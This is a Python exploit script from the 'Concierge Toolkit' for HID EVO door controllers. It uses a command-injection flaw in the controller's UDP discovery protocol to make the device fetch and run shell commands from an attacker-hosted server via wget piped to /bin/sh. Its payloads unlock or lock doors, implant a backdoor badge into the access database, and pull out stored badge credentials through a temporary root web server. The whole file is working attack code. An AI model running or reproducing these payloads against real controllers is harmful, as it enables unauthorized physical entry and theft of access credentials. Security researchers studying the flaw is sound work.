#!/usr/bin/env python
# By Mike Kelly
# exfil.co
# @lixmk
#
# This script is part of the Concierge Toolkit
# https://github.com/lixmk/Concierge
#
# This script will exploit HID EVO Door controllers to issue controller specific commands.
# Available commands are: unlock, lock, blink, or exfil.
#
# Check README.md for more information about these options (especially exfil).
#

import socket
import argparse
import SimpleHTTPServer
import SocketServer
import threading
import urllib2
import re
from time import sleep
from os import remove
from os import path

#Custom except for V1000 related error
class V1000(Exception):
    pass

# Pull HID EVO Information
def discover(rhost, rport):
    # Creating socket
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setblocking(0)
    # Discover command packet data
    pkt0 = "discover;013;"
    print "[*] Sending Discovery Packet..."
    # Sending packet
    s.sendto(pkt0, (rhost, rport))
    s.settimeout(1)
    # Setting global vars
    global rspn
    global rmac
    # Parsing discovery response
    rspn = s.recv(1024)
    rmac = rspn.split(";")[2]
    print "[+] Response: "+rspn.split(";")[0]
    print "[+] Device Type: "+rspn.split(";")[6]
    print "[+] Hostname: "+rspn.split(";")[3]
    print "[+] Internal IP: "+rspn.split(";")[4]
    print "[+] MAC Address: "+rspn.split(";")[2]
    print "[+] Firmware Version: "+rspn.split(";")[7]
    print "[+] Build Date: "+rspn.split(";")[8]
    print ""
    s.close

def inject(rhost, rport): 
    # Converting local IP address to decimal to save payload space
    ipbits = lhost.split('.')
    abcd = (int(ipbits[0])*256**3) + (int(ipbits[1])*256**2) + (int(ipbits[2])*256) + int(ipbits[3])
    local = str(abcd).rstrip('L')
    # Creating socket
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.setblocking(0)
    # Starting local HTTP Server
    SocketServer.TCPServer.allow_reuse_address = True
    httpd = SocketServer.TCPServer(("", lport), SimpleHTTPServer.SimpleHTTPRequestHandler)
    th = threading.Thread(target=httpd.serve_forever)
    th.daemon = True
    th.start()
    # Checking device type for potential warnings
    if rspn.split(";")[6] != "EH400" and rspn.split(";")[6] != "V2000":
        if rspn.split(";")[6] == "V2-V1000":
            print "[!] Device appears to be a VertX V1000. This device has not been thoroughly tested."
            print "[!] This might not work..."
            print ""
        else:
            print "[!] Unrecognized device type "+rspn.split(";")[6]+"."
            print "[!] Assuming most common configuration."
            print "[!] Please submit any unrecognized device types to Concierge github repo issue tracker. https://github.com/lixmk/Concierge"
            print "[!] This might not work..."
            print ""
    # Defining payload and sending injection
    pkt1 = "command_blink_on;044;"+rmac+";1`wget http://"+local+":"+str(lport)+"/c -O-|/bin/sh`;"
    print "[*] Injecting command from: http://"+lhost+":"+str(lport)
    s.sendto(pkt1, (rhost, rport))
    # Sleeping longer for V2000
    if rspn.split(";")[6] == "V2000":
        sleep(5)
    else:
        sleep(1)
    s.close

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='./hidevo-exploit.py -r 10.0.0.1 -l 192.168.1.1 -c exfil')
    parser.add_argument('-r', '--rhost', required=True, help='IP of target door controller')
    parser.add_argument('-l', '--lhost', required=True, help='Local Host IP')
    parser.add_argument('-p', '--lport', type=int, default="8080", help='Local port to host commands (default: %(default)s)')
    parser.add_argument('-c', '--cmd',required=True, help='Command (unlock, lock, blink, exfil, implant)')
    args = parser.parse_args()
    rhost = args.rhost
    rport = 4070
    lport = args.lport
    lhost = args.lhost
  
    print "################################"
    print "# Concierge HID Agent Deployer #"
    print "################################"
    print ""
    print "[*] Targeting HID Controller at: "+rhost
    try:   
        # Implant Badge Command
        if args.cmd == 'implant':
            discover(rhost,rport)
            # Generating payloads
            if rspn.split(";")[6] == "EH400":
                with open("c","w+")as f:
                    f.write(r"echo -n -e \\x00\\x06\\x0a\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x00\\x00\\x0a\\x00 >> /mnt/apps/data/config/IdentDB; echo -n -e \\xff\\xff\\xff\\xff\\x0f\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 >> /mnt/apps/data/config/AccessDB; /etc/init.d/access restart; /etc/init.d/ident restart")
            elif rspn.split(";")[6] == "V2000":
                with open("c","w+")as f:
                    f.write(r"echo \\x00\\x06\\x77\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x00\\x00\\x77\\x00 | tr -d '\012' | tr '\167' '\012'>> /mnt/data/config/IdentDB; echo \\xff\\xff\\xff\\xff\\x0f\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 | tr -d \"\n\" >> /mnt/data/config/AccessDB; /etc/init.d/access restart; /etc/init.d/ident restart")
            elif rspn.split(";")[6] == "V2-1000":
                with open("c","w+")as f:
                    f.write(r"echo -n -e \\x00\\x06\\x0a\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x00\\x00\\x0a\\x00 >> /mnt/apps/data/config/IdentDB; echo -n -e \\xff\\xff\\xff\\xff\\x0f\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 >> /mnt/apps/data/config/AccessDB; /etc/init.d/access restart; /etc/init.d/ident restart")
            else:
                with open("c","w+")as f:
                    f.write(r"echo -n -e \\x00\\x06\\x0a\\x73\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\xfe\\x00\\x00\\x00\\x00\\x00\\x0a\\x00 >> /mnt/apps/data/config/IdentDB; echo -n -e \\xff\\xff\\xff\\xff\\x0f\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 >> /mnt/apps/data/config/AccessDB; /etc/init.d/access restart; /etc/init.d/ident restart")
            inject(rhost,rport)
            remove("c")
            print "[*] Backdoor badge info:"
            print "[+] Facility Code:3 Card Number:1337"
            print "[+] PM3 Hex: 2004060a73"
            print "[+] Encrypted iClass Blk7: 8b0c4cf554bca3fe"
            print ""
            print "[*] Implant Badge injection complete."

        # Unlock Command
        if args.cmd == 'unlock':
            discover(rhost,rport)
            # Generating payloads for different devices
            if rspn.split(";")[6] == "EH400":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            elif rspn.split(";")[6] == "V2000":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=2&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;')
            elif rspn.split(";")[6] == "V2-V1000":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=1&BoardType=V100&Description=Strike&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            else:
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            # Sending injection
            inject(rhost,rport)
            remove("c")
            print "[*] Unlock injection complete."
    
        # Lock Command
        if args.cmd == 'lock':
            discover(rhost,rport)
            # Generating payloads for different devices
            if rspn.split(";")[6] == "EH400":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            elif rspn.split(";")[6] == "V2000":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=2&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;')
            elif rspn.split(";")[6] == "V2-V1000":
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=1&BoardType=V100&Description=Strike&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            else:
                with open("c","w+")as f:
                    f.write('export QUERY_STRING="?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi')
            # Sending injection
            inject(rhost,rport)
            remove("c")
            print "[*] Lock injection complete."

        # Cycle Reader LED Command
        if args.cmd == 'blink':
            discover(rhost,rport)
            # Generating payloads for different devices
            if rspn.split(";")[6] == "EH400":
                with open("c","w+")as f:
                    f.write('i="0"; while [ $i -lt 10 ]; do export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_GREEN&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED_BLUE&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;i=`expr $i + 1`; done')
            elif rspn.split(";")[6] == "V2000":
                with open("c","w+")as f:
                    f.write('i="0"; while [ $i -lt 10 ]; do export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=2&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=2&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;i=`expr $i + 1`; done')
            elif rspn.split(";")[6] == "V2-V1000":
                with open("c","w+")as f:
                    f.write('i="0"; while [ $i -lt 10 ]; do export QUERY_STRING="?ID=1&BoardType=V100&Description=LED&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=1&BoardType=V100&Description=LED&Relay=2&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=1&BoardType=V100&Description=LED&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=1&BoardType=V100&Description=LED&Relay=2&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;i=`expr $i + 1`; done')
            else:
                with open("c","w+")as f:
                    f.write('i="0"; while [ $i -lt 10 ]; do export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=1&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=2&Action=1";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=1&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;export QUERY_STRING="?ID=0&BoardType=V100&Description=LED&Relay=2&Action=0";/mnt/apps/web/cgi-bin/diagnostics_execute.cgi;i=`expr $i + 1`; done')
            # Sending injection
            inject(rhost,rport)
            remove("c")
            print "[*] Blink injection complete."

        # Recover Stored Badges Command
        if args.cmd == 'exfil':
            discover(rhost,rport)
            # Generating payloads for different devices
            if rspn.split(";")[6] == "EH400":
                with open("c","w+")as f:
                    f.write('echo \'server.document-root = "/"\'> /tmp/cfg; echo \'server.port=8080\' >> /tmp/cfg; /usr/sbin/lighttpd -f /tmp/cfg; sleep 15; ps | grep /tmp/cfg | grep light | cut -d " " -f 2 | xargs kill; rm /tmp/cfg')
            elif rspn.split(";")[6] == "V2000":
                with open("c","w+")as f:
                    f.write('echo \'WorkingRoot /\'> /tmp/boa.conf; echo \'Port 8080\'>> /tmp/boa.conf; echo \'User root\'>> /tmp/boa.conf; echo \'Group root\'>> /tmp/boa.conf; echo \'ErrorLog /dev/null\'>> /tmp/boa.conf; echo \'AccessLog /dev/null\'>> /tmp/boa.conf; echo \'UseLocaltime\'>> /tmp/boa.conf; echo \'DocumentRoot /mnt/data/config\'>> /tmp/boa.conf; echo \'UserDir /mnt/data/config\'>> /tmp/boa.conf; echo \'DirectoryIndex index.html\'>> /tmp/boa.conf; echo \'MimeTypes /etc/httpd/conf/mime.types\'>> /tmp/boa.conf; echo \'DefaultType text/plain\'>> /tmp/boa.conf; echo \'CGIPath /bin:/usr/bin:/mnt/apps/web/cgi-bin\'>> /tmp/boa.conf; echo \'ScriptAlias /axis-cgi/ /usr/html/axis-cgi/\'>> /tmp/boa.conf; echo \'ScriptAlias /admin-bin/ /usr/html/admin-bin/\'>> /tmp/boa.conf; echo \'ScriptAlias /cgi-bin/ /mnt/apps/web/cgi-bin/\'>> /tmp/boa.conf; echo \'PasswdFile /tmp/passwd\'>> /tmp/boa.conf; echo \'GroupFile /etc/group\'>> /tmp/boa.conf; echo \'root:password:0:0:Administrator:/:/bin/sh\' > /tmp/passwd; /bin/boa -c /tmp/; sleep 15; ps | grep \'/bin/boa -c /tmp/\' | grep -v grep | cut -d " " -f 1 | xargs kill; rm /tmp/boa.conf /tmp/passwd')
            elif rspn.split(";")[6] == "V2-V1000":
                print "[!] This device appears to be a VertX V1000."
                raise V1000
            else:
                with open("c","w+")as f:
                    f.write('echo \'WorkingRoot /\'> /tmp/boa.conf; echo \'Port 8080\'>> /tmp/boa.conf; echo \'User root\'>> /tmp/boa.conf; echo \'Group root\'>> /tmp/boa.conf; echo \'ErrorLog /dev/null\'>> /tmp/boa.conf; echo \'AccessLog /dev/null\'>> /tmp/boa.conf; echo \'UseLocaltime\'>> /tmp/boa.conf; echo \'DocumentRoot /mnt/data/config\'>> /tmp/boa.conf; echo \'UserDir /mnt/data/config\'>> /tmp/boa.conf; echo \'DirectoryIndex index.html\'>> /tmp/boa.conf; echo \'MimeTypes /etc/httpd/conf/mime.types\'>> /tmp/boa.conf; echo \'DefaultType text/plain\'>> /tmp/boa.conf; echo \'CGIPath /bin:/usr/bin:/mnt/apps/web/cgi-bin\'>> /tmp/boa.conf; echo \'ScriptAlias /axis-cgi/ /usr/html/axis-cgi/\'>> /tmp/boa.conf; echo \'ScriptAlias /admin-bin/ /usr/html/admin-bin/\'>> /tmp/boa.conf; echo \'ScriptAlias /cgi-bin/ /mnt/apps/web/cgi-bin/\'>> /tmp/boa.conf; echo \'PasswdFile /tmp/passwd\'>> /tmp/boa.conf; echo \'GroupFile /etc/group\'>> /tmp/boa.conf; echo \'root:password:0:0:Administrator:/:/bin/sh\' > /tmp/passwd; /bin/boa -c /tmp/; sleep 15; ps | grep \'/bin/boa -c /tmp/\' | grep -v grep | cut -d " " -f 1 | xargs kill; rm /tmp/boa.conf /tmp/passwd')
            # Sending injection
            inject(rhost,rport)
            remove("c")
            # Pulling IdentDB file
            if rspn.split(";")[6] == "EH400":
                idb = urllib2.urlopen("http://"+rhost+":8080/mnt/apps/data/config/IdentDB")
            elif rspn.split(";")[6] == "V2-V1000" or rspn.split(";")[6] == "V2000":
                idb = urllib2.urlopen("http://"+rhost+":8080/IdentDB")
            else:
                idb = urllib2.urlopen("http://"+rhost+":8080/IdentDB")
            idbhex = idb.read().encode('hex')
            idbarray = re.findall('.{56}',idbhex)
            # Parsing IdentDB file and saving to csv
            print "[*] Parsing IdentDB..."
            if path.isfile("hidevo-badges.csv") == 0:
                with open("hidevo-badges.csv","a+")as f:
                    f.write("badge hex,controller ip,controller hostname\n")
            for i in range(len(idbarray)):
                with open("hidevo-badges.csv","a+")as f:
                    f.write(idbarray[i][:10]+","+rhost+","+rspn.split(";")[3]+"\n")
            print "[+] "+str(len(idbarray))+" badges recovered and added to hidevo-badges.csv"
    # Catching known errors
    except (KeyboardInterrupt, SystemExit) as e:
        print "Keyboard Interrupt: Dying"
    except (socket.timeout) as e:
        print "[!] No response from "+rhost+": Exiting"
    except (urllib2.URLError) as e:
        print "[!] Connection refused. Exfil attempt failed."
    except V1000:
        print "[!] Stored badge recovery does not currently work on VertX V1000 devices."
        print "[!] Exiting."
